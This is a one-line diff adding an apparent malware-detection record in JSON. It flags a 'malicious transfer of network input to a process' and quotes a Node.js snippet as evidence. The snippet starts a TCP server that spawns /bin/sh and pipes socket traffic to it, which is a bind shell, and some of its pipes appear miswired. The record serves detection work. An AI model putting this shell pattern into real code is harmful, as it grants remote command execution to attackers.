@@ -1,0 +1,1 @@
+{"Answer": true, "Verdict": "Potential malicious transfer of network input to a process was detected", "Evidence": ["net.createServer(function (socket) {\n    socket.write('Echo server\\r\\n');\n    var myREPL = child.spawn('/bin/sh');\n    socket.pipe(myREPL.stdout)\n    myREPL.stdin.pipe(socket, {end: false});\n})"]}
